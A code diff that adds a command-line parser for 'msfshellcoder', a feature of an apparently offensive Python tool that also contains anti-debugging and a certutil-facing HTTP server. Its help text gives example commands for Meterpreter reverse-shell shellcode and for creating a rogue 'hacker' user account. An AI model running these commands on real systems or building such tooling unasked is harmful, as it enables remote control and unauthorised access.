@@ -3064,6 +3064,25 @@ def anti_debug():
                     print_error("DEBUG DETECTED. EXITING!.")
                     os.kill(os.getpid(), signal.SIGTERM)
 
+def create_msfshellcoder_parser():
+    parser = argparse.ArgumentParser(
+        description="Generate Metasploit shellcode in C format for custom commands or reverse shells.",
+        epilog="""
+Examples:
+  msfshellcoder -p windows/x64/meterpreter/reverse_tcp -H 192.168.1.10 -P 4444
+  msfshellcoder -c "calc.exe" --os windows
+  msfshellcoder
+        """,
+        formatter_class=argparse.RawDescriptionHelpFormatter
+    )
+    parser.add_argument("-p", "--payload", help="MSF payload (e.g., windows/x64/meterpreter/reverse_tcp)")
+    parser.add_argument("-c", "--command", help="Custom command to execute (e.g., 'net user hacker P@ss /add')")
+    parser.add_argument("-H", "--lhost", help="Local host IP")
+    parser.add_argument("-P", "--lport", type=int, help="Local port")
+    parser.add_argument("-o", "--os", choices=["windows", "linux", "win", "lin"], help="Target OS")
+    parser.add_argument("--arch", choices=["x86", "x64"], default="x64", help="Architecture (default: x64)")
+    return parser
+
 class MyServer(HTTPServer):
     """
     Custom HTTP server to handle incoming connections from certutil.
